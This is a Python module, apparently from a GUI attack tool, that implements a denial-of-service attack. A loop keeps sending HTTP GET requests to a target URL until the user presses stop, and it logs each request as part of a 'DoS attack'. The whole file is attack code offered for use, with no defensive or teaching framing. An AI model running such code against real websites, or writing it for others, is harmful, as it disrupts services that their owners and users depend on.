import threading
import requests
from gui.dos_attack.console_view import ConsoleView
from gui.dos_attack.stopped_manager import is_stopped


def perform_dos(target_url, console_view: ConsoleView):

    def send_request():
        try:
            response = requests.get(target_url)
            console_view.add_text_schedule(f"[SUCCESS] Sent request, Status Code: {response.status_code}")
        except Exception as e:
            console_view.add_text_schedule(f"[ERROR] Request failed: {e}")

    console_view.add_text_schedule(f"[INFO] Starting DoS attack on {target_url}. Press 'Stop Attack' to terminate.")

    def attack_loop():
        while not is_stopped():
            thread = threading.Thread(target=send_request)
            thread.start()
            thread.join()

        console_view.add_text_schedule("[INFO] DoS attack stopped by the user.")

    threading.Thread(target=attack_loop, daemon=True).start()
